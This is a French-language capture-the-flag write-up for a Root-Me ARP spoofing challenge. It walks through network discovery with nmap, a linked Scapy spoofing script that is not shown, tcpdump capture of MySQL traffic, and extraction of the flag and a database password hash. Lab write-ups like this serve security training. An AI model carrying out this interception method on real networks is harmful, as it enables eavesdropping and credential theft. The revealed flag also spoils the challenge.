# [ARP Spoofing - Écoute active](https://www.root-me.org/fr/Challenges/Reseau/ARP-Spoofing-Ecoute-active)

L'objectif de ce projet est de réaliser une attaque de type ARP Spoofing pour intercepter les communications réseau entre un client et une base de données.

## Analyse du réseau

### Configuration réseau locale

En exécutant la commande `ifconfig` sur la machine, on identifie que notre interface réseau utilise l'adresse IP `172.18.0.3` et le masque de sous-réseau `255.255.0.0`.

```
root@fac50de5d760:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.3  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:ac:12:00:03  txqueuelen 0  (Ethernet)
        RX packets 56  bytes 8009 (8.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 36  bytes 7249 (7.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Détection des hôtes sur le réseau

En lançant une analyse avec `nmap`, on identifie les hôtes actifs sur le réseau :

```
root@fac50de5d760:~# nmap -sn 172.18.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-23 23:30 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000023s latency).
MAC Address: 02:42:FC:62:FE:C1 (Unknown)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.2)
Host is up (0.000028s latency).
MAC Address: 02:42:AC:12:00:02 (Unknown)
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000037s latency).
MAC Address: 02:42:AC:12:00:04 (Unknown)
Nmap scan report for fac50de5d760 (172.18.0.3)
Host is up.
```

On obtient ainsi la configuration réseau suivante :

| Hôte            | Adresse IP | Adresse MAC       |
| --------------- | ---------- | ----------------- |
| Routeur         | 172.18.0.1 | 02:42:FC:62:FE:C1 |
| Base de données | 172.18.0.2 | 02:42:AC:12:00:02 |
| Machine locale  | 172.18.0.3 | 02:42:AC:12:00:03 |
| Client          | 172.18.0.4 | 02:42:AC:12:00:04 |

## Mise en place de l'attaque

Le script Python [`arp_spoofing.py`](./arp_spoofing.py) utilise Scapy pour envoyer des paquets ARP falsifiés. Ces paquets redirigent le trafic entre le client et la base de données à travers notre machine.

On lance le script Python en arrière-plan :

```bash
python3 ./arp_spoofing.py &
```

## Capture du trafic réseau

Une fois le trafic redirigé via notre machine, nous utilisons `tcpdump` pour écouter les paquets transitant sur le port MySQL (3306).

```bash
tcpdump port 3306 -vv -X
```

Les paquets capturés sont fournis dans le fichier [`capture.txt`](./capture.txt) et un extrait de la capture est affichée ci-dessous :

```
tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
...
23:49:02.075669 IP (tos 0x0, ttl 64, id 17792, offset 0, flags [DF], proto TCP (6), length 130)
    db.arp-spoofing-dist-2_default.mysql > client.arp-spoofing-dist-2_default.46254: Flags [P.], cksum 0x58a0 (incorrect -> 0x8703), seq 1:79, ack 1, win 510, options [nop,nop,TS val 1609413276 ecr 1129465516], length 78
	0x0000:  4500 0082 4580 4000 4006 9cca ac12 0004  E...E.@.@.......
	0x0010:  ac12 0003 0cea b4ae ff57 9c49 e380 527a  .........W.I..Rz
	0x0020:  8018 01fe 58a0 0000 0101 080a 5fed b29c  ....X......._...
	0x0030:  4352 46ac 4a00 0000 0a35 2e37 2e34 3100  CRF.J....5.7.41.
	0x0040:  0800 0000 7459 0d76 7125 5511 00ff ff08  ....tY.vq%U.....
	0x0050:  0200 ffc1 1500 0000 0000 0000 0000 007d  ...............}
	0x0060:  355e 3846 0c47 6f0c 0f4d 7600 6d79 7371  5^8F.Go..Mv.mysq
	0x0070:  6c5f 6e61 7469 7665 5f70 6173 7377 6f72  l_native_passwor
	0x0080:  6400                                     d.
23:49:02.075677 IP (tos 0x0, ttl 63, id 17792, offset 0, flags [DF], proto TCP (6), length 130)
    db.arp-spoofing-dist-2_default.mysql > client.arp-spoofing-dist-2_default.46254: Flags [P.], cksum 0x58a0 (incorrect -> 0x8703), seq 1:79, ack 1, win 510, options [nop,nop,TS val 1609413276 ecr 1129465516], length 78
	0x0000:  4500 0082 4580 4000 3f06 9dca ac12 0004  E...E.@.?.......
	0x0010:  ac12 0003 0cea b4ae ff57 9c49 e380 527a  .........W.I..Rz
	0x0020:  8018 01fe 58a0 0000 0101 080a 5fed b29c  ....X......._...
	0x0030:  4352 46ac 4a00 0000 0a35 2e37 2e34 3100  CRF.J....5.7.41.
	0x0040:  0800 0000 7459 0d76 7125 5511 00ff ff08  ....tY.vq%U.....
	0x0050:  0200 ffc1 1500 0000 0000 0000 0000 007d  ...............}
	0x0060:  355e 3846 0c47 6f0c 0f4d 7600 6d79 7371  5^8F.Go..Mv.mysq
	0x0070:  6c5f 6e61 7469 7665 5f70 6173 7377 6f72  l_native_passwor
	0x0080:  6400                                     d.
...
23:49:02.078000 IP (tos 0x0, ttl 64, id 17799, offset 0, flags [DF], proto TCP (6), length 174)
    db.arp-spoofing-dist-2_default.mysql > client.arp-spoofing-dist-2_default.46254: Flags [P.], cksum 0x58cc (incorrect -> 0x26bc), seq 364:486, ack 418, win 508, options [nop,nop,TS val 1609413278 ecr 1129465519], length 122
	0x0000:  4500 00ae 4587 4000 4006 9c97 ac12 0004  E...E.@.@.......
	0x0010:  ac12 0003 0cea b4ae ff57 9db4 e380 541b  .........W....T.
	0x0020:  8018 01fc 58cc 0000 0101 080a 5fed b29e  ....X......._...
	0x0030:  4352 46af 0100 0001 012c 0000 0203 6465  CRF......,....de
	0x0040:  6606 666c 6167 6462 0466 6c61 6704 666c  f.flagdb.flag.fl
	0x0050:  6167 0466 6c61 6704 666c 6167 0c2d 00fc  ag.flag.flag.-..
	0x0060:  0300 00fd 0110 0000 0036 0000 0335 6669  .........6...5fi
	0x0070:  7273 7420 7061 7274 206f 6620 7468 6520  rst.part.of.the.
	0x0080:  666c 6167 3a20 6c31 7474 6572 346c 6c79  flag:.l1tter4lly
	0x0090:  5f34 5f63 3470 7475 7233 5f74 6833 5f66  _4_c4ptur3_th3_f
	0x00a0:  6c34 6707 0000 04fe 0000 2100 0000       l4g.......!...
23:49:02.078006 IP (tos 0x0, ttl 63, id 17799, offset 0, flags [DF], proto TCP (6), length 174)
    db.arp-spoofing-dist-2_default.mysql > client.arp-spoofing-dist-2_default.46254: Flags [P.], cksum 0x58cc (incorrect -> 0x26bc), seq 364:486, ack 418, win 508, options [nop,nop,TS val 1609413278 ecr 1129465519], length 122
	0x0000:  4500 00ae 4587 4000 3f06 9d97 ac12 0004  E...E.@.?.......
	0x0010:  ac12 0003 0cea b4ae ff57 9db4 e380 541b  .........W....T.
	0x0020:  8018 01fc 58cc 0000 0101 080a 5fed b29e  ....X......._...
	0x0030:  4352 46af 0100 0001 012c 0000 0203 6465  CRF......,....de
	0x0040:  6606 666c 6167 6462 0466 6c61 6704 666c  f.flagdb.flag.fl
	0x0050:  6167 0466 6c61 6704 666c 6167 0c2d 00fc  ag.flag.flag.-..
	0x0060:  0300 00fd 0110 0000 0036 0000 0335 6669  .........6...5fi
	0x0070:  7273 7420 7061 7274 206f 6620 7468 6520  rst.part.of.the.
	0x0080:  666c 6167 3a20 6c31 7474 6572 346c 6c79  flag:.l1tter4lly
	0x0090:  5f34 5f63 3470 7475 7233 5f74 6833 5f66  _4_c4ptur3_th3_f
	0x00a0:  6c34 6707 0000 04fe 0000 2100 0000       l4g.......!...
```

## Extraction des données

En analysant les paquets capturés, on identifie :
- La réponse à une requête MySQL contenant le flag `l1tter4lly_4_c4ptur3_th3_fl4g`.
- Le hash du mot de passe de la base de données : `c14482ff0488945195379dcb6c2c88fe9adff6ee`.
